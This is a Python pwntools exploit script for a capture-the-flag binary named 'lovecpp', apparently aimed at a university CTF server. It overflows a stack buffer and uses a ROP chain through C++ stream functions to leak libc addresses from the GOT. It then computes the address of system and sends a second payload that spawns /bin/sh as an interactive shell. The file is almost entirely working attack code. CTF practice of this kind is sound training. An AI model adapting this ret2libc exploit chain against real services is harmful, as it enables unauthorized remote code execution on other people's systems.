#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context(arch='i386', os='linux')
context.log_level = 'debug'

fn = './lovecpp'
elf = ELF(fn)

offset = 0x1d + 12
ppp_ret = 0x08048c7d  # pop esi ; pop edi ; pop ebp ; ret
pp_ret = 0x08048c7e  # pop edi ; pop ebp ; ret
pop_ebp_ret = 0x08048c7f  # pop ebp ; ret
leave_ret = 0x08048738  # leave ; ret

stack_size = 0x800
stack_base = 0x0804A200
stack_stage = stack_base + stack_size

if len(sys.argv) == 1:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    io = process(fn)
else:
    libc = ELF('./libc.so.6')
    io = remote('bamboofox.cs.nctu.edu.tw', 11004)

io.recvuntil('name:\n')
io.sendline('/bin/sh'.ljust(20, '\x00') + '\xff')
io.recvuntil('10. C++\n')
io.sendline('2')
io.recvuntil('it?\n')

payload = ''.join([
    'a' * offset,
    p32(0x08048660),  # __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
    p32(pp_ret),  # 居然可以，不知道为什么……
    p32(0x0804A100),  # _ZSt4cout@@GLIBCXX_3_4
    p32(elf.got['strlen']),  # 输出strlen_got内容
    p32(0x080486A0),  # __ZNSolsEPFRSoS_E
    p32(elf.symbols['_start']),
    p32(0x804a100),  # mov     [esp], eax 但这里eax是一个固定的值 _ZSt4cout@@GLIBCXX_3_4
    p32(0x080486B0),  # __ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
])

io.sendline(payload)

sleep(0.5)

io.recvuntil('day!\n')
strlen_addr = u32(io.recv(4))
log.success('strlen_addr = %s', hex(strlen_addr))
atoi_addr = u32(io.recv(4))
log.success('atoi_addr = %s', hex(atoi_addr))

system_addr = libc.symbols['system'] - libc.symbols['atoi'] + atoi_addr
log.success('system_addr = %s', hex(system_addr))

io.recvuntil('name:\n')
io.sendline('/bin/sh'.ljust(20, '\x00') + '\xff')
io.recvuntil('10. C++\n')
io.sendline('2')
io.recvuntil('it?\n')

payload = ''.join([
    'a' * offset,
    p32(system_addr),
    p32(0xdeadbeef),
    p32(0x0804A190),  # name in bss
])

io.sendline(payload)

io.interactive()
